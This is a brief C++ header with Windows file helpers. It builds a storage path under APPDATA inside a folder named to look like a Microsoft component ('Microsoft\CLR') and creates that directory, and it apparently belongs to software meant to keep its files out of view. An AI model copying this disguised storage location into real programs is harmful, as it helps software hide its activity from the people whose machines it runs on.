
#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetourPath (const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string appdata_dir_full = appdata_dir + "\\Microsoft\\CLR";
        return appdata_dir_full + (append_seperator ? "\\" : "");
    }

    bool MakeOneDir(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }
}
#endif // IO_H
